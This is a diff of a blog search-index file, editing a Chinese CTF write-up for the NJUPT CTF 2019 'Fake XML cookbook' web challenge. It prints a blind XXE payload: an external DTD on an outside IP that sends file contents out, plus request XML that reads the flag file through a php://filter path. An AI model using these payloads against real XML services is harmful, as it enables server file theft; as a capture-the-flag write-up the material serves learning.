@@ -3,10 +3,10 @@
   <entry>
     <title>NJUPT CTF 2019 web部分writeup</title>
     <url>/2019/11/24/NJUPT%20CTF%202019%20web%E9%83%A8%E5%88%86writeup/</url>
-    <content><![CDATA[<p>题目挺好玩的，很多不会，慢慢写还是有点思路的，两天写了四个web题，学到了很多新知识。</p><p>1.Fake XML cookbook </p><p>测试了一下，没有回显，所以进行参数实体的注入，在vps上放一个xml文件，让它加载，文件内容如下</p><a id="more"></a>
+    <content><![CDATA[<p>题目挺好玩的，很多不会，慢慢写还是有点思路的，学到了很多新知识。</p><p>1.Fake XML cookbook </p><p>测试了一下，没有回显，所以进行参数实体的注入，在vps上放一个xml文件，让它加载，文件内容如下</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % payload "&lt;!ENTITY &amp;#x25; send SYSTEM 'http://47.103.62.94:8080/?content=%file;'&gt;"&gt; %payload;</span><br></pre></td></tr></table></figure><a id="more"></a>
 
 
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % payload "&lt;!ENTITY &amp;#x25; send SYSTEM 'http://47.103.62.94:8080/?content=%file;'&gt;"&gt; %payload;</span><br></pre></td></tr></table></figure>
+
 
 <p>因为题目提示了flag is in /flag，所以构造请求的xml内容如下</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span> &lt;!DOCTYPE test[ &lt;!ENTITY % file SYSTEM <span class="string">"php://filter/read=convert.base64-encode/resource=../../../flag"</span>&gt; &lt;!ENTITY % dtd SYSTEM <span class="string">"http://47.103.62.94:8080/evil.xml"</span>&gt; %dtd; %send; ]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">  &lt;username&gt;<span class="number">1</span>&lt;/username&gt;</span><br><span class="line">  &lt;password&gt;<span class="number">1</span>&lt;/password&gt;</span><br><span class="line">  &lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure>
